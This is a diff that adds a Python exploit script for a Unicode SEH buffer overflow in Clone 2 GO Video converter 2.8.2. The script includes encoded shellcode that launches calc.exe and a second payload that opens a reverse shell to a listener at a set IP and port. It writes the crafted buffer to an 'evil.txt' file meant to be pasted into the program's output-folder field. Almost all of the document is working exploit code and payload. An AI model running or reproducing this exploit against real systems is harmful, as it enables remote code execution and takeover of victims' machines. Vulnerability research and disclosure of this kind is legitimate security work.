@@ -1,0 +1,34 @@
+#!/usr/bin/python
+#----------------------------------------------------------------------------------------------------------------------#
+# Exploit Title      : Clone 2 GO Video converter 2.8.2 Unicode Buffer Overflow (Remote Code Execution)        		   #
+# Exploit Author     : Gokul Babu				                                  			   						   #
+# Organisation		 : Arridae Infosec P.V Ltd																		   #
+# Vendor Homepage    : http://www.clone2go.com/products/videoconverter.php                                             #
+# Vulnerable Software: http://www.clone2go.com/down/video-converter-setup.exe			                               #
+# Tested on          : Windows-7 64-bit(eip-828)(Other windows versions also vulnerable Only Eip overwrite will change #
+# Steps to reproduce :  Open the evil.txt paste the contents in Options -> Set output folder -> Browse 				   #
+#----------------------------------------------------------------------------------------------------------------------#
+
+#payload generation method
+#msfpayload windows/exec CMD=calc.exe R > calc.raw
+#./alpha2 eax --unicode --uppercase < calc.raw
+
+#seh-"004d00b3"
+#\x73-venetian pad(other things didn't work)
+#248 bytes of padding before shellcode is required which is 124 bytes in Unicode
+#EAX register is used for operation
+
+seh= "\x41\x73" + "\xb3\x4d"
+operation="\x73\x53\x73\x58\x73\x05\x0b\x01\x73\x2d\x02\x01\x73\x50\x73\xc3" + "\x90"*124
+
+shellcode=("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLK83YKPKPKPS0TIYUNQ8RC4TKPRP0TK0RLL4KPRLT4KRRNHLOWGPJMVNQKO01GP6LOLQQCLM2NLMPWQXOLMKQ97IRL0PR0W4K22LP4KOROLKQ8P4KOP2XU5WP2TPJKQXPPPDKPHMHTK28MPKQXSK3OLOYTKP4TKKQXVNQKONQWP6LY1XOLMKQWW08K0RUL4M3SMZXOK3MNDBUIRQH4KB8MTKQXSBFDKLLPKTK0XMLM1IC4KKTDKM1HPSY14MTNDQKQKQQ0YPZR1KOIPQHQO1J4KLRJKE6QMRJKQTMU5VYKPM0M0PPS801TKROTGKOJ57KJP7EUR1FQXW6TUGM5MKOXUOLLFSLLJSPKK9P2UM57KOWN3T2BOBJKP1CKO8UQSC1RL2CKPA")
+
+#msfpayload windows/shell_reverse_tcp LHOST=172.20.10.3 LPORT=4444 R > reverse.raw
+#./alpha2 eax --unicode --uppercase < reverse.raw 
+reverse=("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKL9X3YM0KPKPQPTIYUNQYBQTDKR2NPTKPRLL4KQBMDTKBRMXLOVWOZMVP1KONQWP6LOLQQSLKRNLMPWQXOLMM1Y7YRL022B7TKPRLPDKOROLKQHPDKOP2XCUY044OZKQJ00PTKOXN84KPXMPKQ9CK3OLQ9TKNT4KKQZ6P1KONQ7P6LWQHOLMKQ97OHIPBUJTM3SMKHOK3MNDRUK2R84KQHNDKQZ3S64KLL0KTKR8MLKQICTKM44KKQHPDIOTO4O4QKQK1Q0YPZPQKOK0QH1O1JTKLRZKDF1MS8NSNRKPKP1XT7BSNR1O0TQXPLCGMVKWKO8UFX4PKQKPKPMY940TPPBHO9502KKPKO9EPP0P20PPOPR0OP0P1XJJLO9O9PKO8UTIXGRH6LN4LJLCQXLBM0LQQLDI9VQZLPPVPW1XTYEUT4QQKOJ5BHQSBMQTM0U9JCR7270WP1JV1ZMBPYR6YRKM1VY7PDNDOLKQM1TMOTO4LPGVKPQ4PTPPB6PVPVOVB60NPVPV0SPVRH2Y8LOO3VKO9ESYK00NR6OVKO00S8LHDGMMQPKOXUGKJPVUVBPVRH76TUWMUMKOJ5OLKVSLLJ3PKKYPT5KUWKOWMCRRRO1ZKPPSKOZ5A")
+
+buf="A"*828 + seh + operation + shellcode + "D"*(4164-len(operation) -len(shellcode))
+
+f=open("evil.txt","w")
+f.write(buf)
+f.close()
